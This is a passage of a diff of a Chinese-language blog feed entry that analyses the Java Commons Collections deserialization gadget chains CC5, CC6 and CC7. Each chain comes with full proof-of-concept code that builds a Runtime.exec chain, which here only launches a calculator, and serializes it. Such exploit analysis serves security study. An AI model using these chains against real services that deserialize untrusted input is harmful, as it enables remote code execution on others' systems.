-                || valObj instanceof Boolean) &#123;
-            val = valObj.toString();
-        &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix
-            val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();
-        &#125;
-    &#125;
-</code></pre>
-<h2 id="攻击构造-1"><a href="#攻击构造-1" class="headerlink" title="攻击构造"></a>攻击构造</h2><pre><code>public class CC5 &#123;
-
-    public static String fileName = &quot;CC5.bin&quot;;
-
-    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;
-
-        // 创建 ChainedTransformer
-        ChainedTransformer chain = new ChainedTransformer(new Transformer[]&#123;
-                new ConstantTransformer(Runtime.class),
-                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
-                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
-                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
-        &#125;);
-
-        // 创建 LazyMap 并引入 TiedMapEntry
-        Map lazyMap = LazyMap.decorate(new HashMap(), chain);
-        TiedMapEntry entry   = new TiedMapEntry(lazyMap, &quot;1azy&quot;);
-
-        // 实例化 BadAttributeValueExpException 并反射写入
-        BadAttributeValueExpException exception = new BadAttributeValueExpException(&quot;1azy&quot;);
-        Field field     = BadAttributeValueExpException.class.getDeclaredField(&quot;val&quot;);
-        field.setAccessible(true);
-        field.set(exception, entry);
-
-        SerializeUtil.write(exception, fileName);
-        SerializeUtil.read(fileName);
-    &#125;
-
-&#125;
-</code></pre>
-<h1 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h1><p>在 CC5 中我们使用了 <code>TiedMapEntry#toString</code> 来触发 <code>LazyMap#get</code>，在 CC6 中是通过 <code>TiedMapEntry#hashCode</code> 来触发。之前看到了 hashcode 方法也会调用 <code>getValue()</code> 方法然后调用到其中 map 的 get 方法触发 LazyMap。</p>
-<p>需要一个入口触发<code>hashCode</code></p>
-<h2 id="maven依赖版本-1"><a href="#maven依赖版本-1" class="headerlink" title="maven依赖版本"></a>maven依赖版本</h2><pre><code>&lt;dependency&gt;
-    &lt;groupId&gt;commons-collections&lt;/groupId&gt;
-    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
-    &lt;version&gt;3.1&lt;/version&gt;
-&lt;/dependency&gt;
-</code></pre>
-<h2 id="前置知识-4"><a href="#前置知识-4" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h3><p>HashSet 是一个无序的，不允许有重复元素的集合。HashSet 本质上就是由 HashMap 实现的。HashSet 中的元素都存放在 HashMap 的 key 上面，而 value 中的值都是统一的一个<code>private static final Object PRESENT = new Object();</code>。HashSet 跟 HashMap 一样，都是一个存放链表的数组。</p>
-<p>在 HashSet 的 readObject 方法中，会调用其内部 HashMap 的 put 方法，将值放在 key 上。</p>
-<h2 id="攻击构造-2"><a href="#攻击构造-2" class="headerlink" title="攻击构造"></a>攻击构造</h2><pre><code>public class CC6WithHashMap &#123;
-
-    public static String fileName = &quot;CC6WithHashMap.bin&quot;;
-
-    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, InvocationTargetException &#123;
-
-        // 初始化 HashMap
-        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
-
-        // 创建 ChainedTransformer
-        Transformer[] transformers = new Transformer[]&#123;
-                new ConstantTransformer(Runtime.class),
-                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
-                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
-                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
-        &#125;;
-
-        // 创建一个空的 ChainedTransformer
-        ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]&#123;&#125;);
-
-        // 创建 LazyMap 并引入 TiedMapEntry
-        Map lazyMap = LazyMap.decorate(new HashMap(), fakeChain);
-        TiedMapEntry entry   = new TiedMapEntry(lazyMap, &quot;1&quot;);
-
-        hashMap.put(entry, &quot;1azy&quot;);
-
-        //用反射再改回真的chain
-        Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
-        f.setAccessible(true);
-        f.set(fakeChain, transformers);
-        //清空由于 hashMap.put 对 LazyMap 造成的影响
-        lazyMap.clear();
-
-        // 反射调用 HashMap 的 putVal 方法
-//		Method[] m = Class.forName(&quot;java.util.HashMap&quot;).getDeclaredMethods();
-//		for (Method method : m) &#123;
-//			if (&quot;putVal&quot;.equals(method.getName())) &#123;
-//				method.setAccessible(true);
-//				method.invoke(hashMap, -1, entry, 0, false, true);
-//			&#125;
-//		&#125;
-
-        SerializeUtil.write(hashMap, fileName);
-        SerializeUtil.read(fileName);
-    &#125;
-
-&#125;
-</code></pre>
-<h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>以上就是 CC6 链分析的全部内容了，最后总结一下。</p>
-<ol>
-<li>利用说明：<ul>
-<li>反序列化 调用 TiedMapEntry 的 toString 方法，简介调用了 LazyMap 的 hashCode 方法，触发了后续的 Transformer 恶意执行链。</li>
-</ul>
-</li>
-<li>Gadget 总结：<ul>
-<li>kick-off gadget：<code>java.util.HashSet#readObject()</code>&#x2F;<code>java.util.HashMap#readObject()</code></li>
-<li>sink gadget：<code>org.apache.commons.collections.functors.InvokerTransformer#transform()</code></li>
-<li>chain gadget：<code>org.apache.commons.collections.keyvalue.TiedMapEntry#hashCode()</code></li>
-</ul>
-</li>
-</ol>
-<h1 id="CommonsCollections7"><a href="#CommonsCollections7" class="headerlink" title="CommonsCollections7"></a>CommonsCollections7</h1><p>寻找<code>TiedMapEntry#hashCode</code> 来触发 <code>lazysugar#put</code>，<code>Hashtable</code>满足</p>
-<h2 id="maven依赖版本-2"><a href="#maven依赖版本-2" class="headerlink" title="maven依赖版本"></a>maven依赖版本</h2><pre><code>&lt;dependency&gt;
-    &lt;groupId&gt;commons-collections&lt;/groupId&gt;
-    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
-    &lt;version&gt;3.1&lt;/version&gt;
-&lt;/dependency&gt;
-</code></pre>
-<h2 id="前置知识-5"><a href="#前置知识-5" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="Hashtable"><a href="#Hashtable" class="headerlink" title="Hashtable"></a>Hashtable</h3><p>Hashtable 与 HashMap 十分相似，是一种 key-value 形式的哈希表，但仍然存在一些区别：</p>
-<ul>
-<li>HashMap 继承 AbstractMap，而 Hashtable 继承 Dictionary ，可以说是一个过时的类。</li>
-<li>两者内部基本都是使用“数组-链表”的结构，但是 HashMap 引入了红黑树的实现。</li>
-<li>Hashtable 的 key-value 不允许为 null 值，但是 HashMap 则是允许的，后者会将 key&#x3D;null 的实体放在 index&#x3D;0 的位置。</li>
-<li>Hashtable 线程安全，HashMap 线程不安全。</li>
-</ul>
-<p>Hashtable 的 readObject 方法中，最后调用了 <code>reconstitutionPut</code> 方法将反序列化得到的 key-value 放在内部实现的 Entry 数组 table 里。</p>
-<p><img src="/images/20230505150925.png"></p>
-<p><code>reconstitutionPut</code> 调用了 key 的 hashCode 方法。</p>
-<p><img src="/images/20230505150943.png"></p>
-<h2 id="攻击构造-3"><a href="#攻击构造-3" class="headerlink" title="攻击构造"></a>攻击构造</h2><pre><code>public class CC7 &#123;
-
-    public static String fileName = &quot;CC7.bin&quot;;
-
-    public static void main(String[] args) throws Exception &#123;
-        // 初始化 HashMap
-        Hashtable&lt;Object, Object&gt; hashtable = new Hashtable&lt;&gt;();
-
-        // 创建 ChainedTransformer
-        Transformer[] transformers = new Transformer[]&#123;
-                new ConstantTransformer(Runtime.class),
-                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
-                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
-                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;open -a Calculator.app&quot;&#125;)
-        &#125;;
-
-        // 创建一个空的 ChainedTransformer
-        ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]&#123;&#125;);
-
-        // 创建 LazyMap 并引入 TiedMapEntry
-        Map lazyMap = LazyMap.decorate(new HashMap(), fakeChain);
-        TiedMapEntry entry   = new TiedMapEntry(lazyMap, &quot;1&quot;);
-
-        hashtable.put(entry, &quot;1azy&quot;);
-
-        //用反射再改回真的chain
-        Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
-        f.setAccessible(true);
-        f.set(fakeChain, transformers);
-        //清空由于 hashtable.put 对 LazyMap 造成的影响
-        lazyMap.clear();
-
-        SerializeUtil.write(hashtable, fileName);
-        SerializeUtil.read(fileName);
-    &#125;
-&#125;
-</code></pre>
-<h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><p>以上就是 CC7 链分析的全部内容了，最后总结一下。</p>
-<ol>
-<li>利用说明：<ul>
-<li>用 Hashtable 代替 HashMap 触发 LazyMap 方式，与 CC6 HashMap 几乎一致。</li>
-</ul>
-</li>
-<li>Gadget 总结：<ul>
-<li>kick-off gadget：<code>java.util.Hashtable#readObject()</code></li>
-<li>sink gadget：<code>org.apache.commons.collections.functors.InvokerTransformer#transform()</code></li>
-<li>chain gadget：<code>org.apache.commons.collections.keyvalue.TiedMapEntry#hashCode()</code></li>
-</ul>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>java安全</category>
-      </categories>
-      <tags>
-        <tag>java安全</tag>
-        <tag>反序列化</tag>
-        <tag>CC链</tag>
       </tags>
   </entry>
   <entry>
